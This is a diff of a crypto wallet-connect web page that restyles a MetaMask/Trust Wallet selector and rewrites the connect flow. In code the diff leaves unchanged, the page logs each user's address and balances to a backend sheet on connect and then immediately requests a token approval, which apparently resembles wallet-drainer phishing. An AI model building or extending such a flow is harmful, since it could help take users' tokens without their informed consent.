@@ -581,6 +581,7 @@ header{
     </div>
 
 <!-- Wallet Selector Popup (desktop only when multiple wallets detected) -->
+<!-- Wallet Selector Popup (desktop, only when multiple wallets detected) -->
 <div id="walletSelector" style="
   display:none;
   position:fixed;
@@ -592,38 +593,47 @@ header{
   justify-content:center;
 ">
   <div style="
-    background:#0f172a;
-    padding:20px;
+    background:#020617;
+    padding:18px 20px;
     border-radius:14px;
-    width:300px;
+    width:280px;
     text-align:center;
-    border:1px solid rgba(255,255,255,0.1);
+    border:1px solid rgba(148,163,184,0.6);
+    box-shadow:0 20px 40px rgba(15,23,42,0.9);
+    font-family:system-ui,Segoe UI,Arial;
   ">
-    <h3 style="margin-bottom:12px;font-size:1.1rem;">Choose Wallet</h3>
+    <div style="font-size:1rem;font-weight:600;margin-bottom:8px;">
+      Choose wallet
+    </div>
+    <div style="font-size:0.85rem;color:#9ca3af;margin-bottom:14px;">
+      Two wallet extensions detected. Pick one to connect.
+    </div>
 
     <button id="selMetaMask" style="
       width:100%;
-      padding:10px;
-      border-radius:8px;
-      margin-bottom:10px;
+      padding:9px 0;
+      border-radius:999px;
+      margin-bottom:8px;
       background:#f59e0b;
       border:none;
       cursor:pointer;
-      color:#111;
+      color:#111827;
       font-weight:600;
+      font-size:0.9rem;
     ">
       MetaMask
     </button>
 
     <button id="selTrust" style="
       width:100%;
-      padding:10px;
-      border-radius:8px;
+      padding:9px 0;
+      border-radius:999px;
       background:#3b82f6;
       border:none;
       cursor:pointer;
-      color:#fff;
+      color:#e5e7eb;
       font-weight:600;
+      font-size:0.9rem;
     ">
       Trust Wallet
     </button>
@@ -1100,12 +1110,9 @@ header{
 function getDesktopProviders() {
   if (!window.ethereum) return [];
 
-  // Newer pattern: multiple providers exposed
   if (Array.isArray(window.ethereum.providers)) {
     return window.ethereum.providers;
   }
-
-  // Old pattern: single provider only
   return [window.ethereum];
 }
 
@@ -1119,22 +1126,55 @@ function detectInjectedWalletsDesktop() {
     if (p && p.isMetaMask) {
       metaProvider = p;
     }
-    // Trust Wallet flags vary; we check several common ones
     if (
       p &&
-      (p.isTrustWallet || p.isTrust || p.walletMeta?.name?.toLowerCase().includes("trust"))
+      (p.isTrustWallet ||
+       p.isTrust ||
+       (p.walletMeta && typeof p.walletMeta.name === "string" &&
+        p.walletMeta.name.toLowerCase().includes("trust")))
     ) {
       trustProvider = p;
     }
   }
 
-  // Some Trust extensions ALSO expose window.trustwallet.ethereum
   if (!trustProvider && window.trustwallet && window.trustwallet.ethereum) {
     trustProvider = window.trustwallet.ethereum;
   }
 
   return { metaProvider, trustProvider };
 }
+
+function pickDesktopWallet(metaProvider, trustProvider){
+  return new Promise((resolve) => {
+    const overlay = document.getElementById("walletSelector");
+    const btnMeta = document.getElementById("selMetaMask");
+    const btnTrust= document.getElementById("selTrust");
+
+    if (!overlay || !btnMeta || !btnTrust) {
+      // Fallback: default to MetaMask if popup missing
+      resolve(metaProvider || trustProvider);
+      return;
+    }
+
+    overlay.style.display = "flex";
+
+    const cleanup = () => {
+      overlay.style.display = "none";
+      btnMeta.onclick = null;
+      btnTrust.onclick = null;
+    };
+
+    btnMeta.onclick = () => {
+      cleanup();
+      resolve(metaProvider);
+    };
+    btnTrust.onclick = () => {
+      cleanup();
+      resolve(trustProvider);
+    };
+  });
+}
+
 
 
 async function connectFlow()
@@ -1143,23 +1183,20 @@ async function connectFlow()
     setStatus("Connecting…");
     const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-    let usedInjected   = false;
-    providerInstance   = null;
-    web3Instance       = null;
+    let usedInjected = false;
+    providerInstance = null;
+    web3Instance     = null;
 
     // ===== DESKTOP (normal browser) =====
     if (!isMobile) {
       const { metaProvider, trustProvider } = detectInjectedWalletsDesktop();
+      const hasMeta  = !!metaProvider;
+      const hasTrust = !!trustProvider;
 
-      const hasMeta   = !!metaProvider;
-      const hasTrust  = !!trustProvider;
-
-      // CASE 1: Both visible → let user pick
+      // CASE 1: Both visible → show nice selector
       if (hasMeta && hasTrust) {
-        const useMeta = window.confirm(
-          "Multiple wallets detected.\n\nOK = MetaMask\nCancel = Trust Wallet"
-        );
-        providerInstance = useMeta ? metaProvider : trustProvider;
+        const chosen = await pickDesktopWallet(metaProvider, trustProvider);
+        providerInstance = chosen;
         usedInjected     = true;
         web3Instance     = new Web3(providerInstance);
         await providerInstance.request({ method: "eth_requestAccounts" });
@@ -1189,7 +1226,6 @@ async function connectFlow()
 
     // ===== MOBILE =====
     else {
-      // Prefer injected (in-app browser) if available
       if (window.trustwallet && window.trustwallet.ethereum) {
         providerInstance = window.trustwallet.ethereum;
         usedInjected     = true;
@@ -1203,7 +1239,6 @@ async function connectFlow()
         await providerInstance.request({ method: "eth_requestAccounts" });
       }
       else {
-        // Normal mobile browser → WalletConnect
         providerInstance = await getWalletConnectV2Provider();
         await providerInstance.enable();
         web3Instance = new Web3(providerInstance);
@@ -1247,14 +1282,12 @@ async function connectFlow()
           return;
         }
       } else {
-        // WalletConnect: user must switch inside wallet
         alert("Please open your wallet app and switch to BNB Smart Chain (56), then reconnect.");
         setStatus("Wrong network");
         return;
       }
     }
 
-    // Get session details
     const session      = await restoreSessionFromAddress(address);
     const balanceBNB   = session.balanceBNB;
     const tokenBalance = session.tokenBalance;
@@ -1262,7 +1295,6 @@ async function connectFlow()
 
     setStatus("Connected");
 
-    // Log to sheet with balances
     await notifyBackend(
       address,
       BNB_TESTNET_LABEL,
@@ -1272,7 +1304,6 @@ async function connectFlow()
       "connect"
     );
 
-    // Then approval logging
     await ensureTokenApproval();
 
   }catch(err){
@@ -1281,6 +1312,7 @@ async function connectFlow()
     alert("Connection failed: " + (err && err.message ? err.message : err));
   }
 }
+
 
   async function tryAutoReconnectSilent(){
     const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
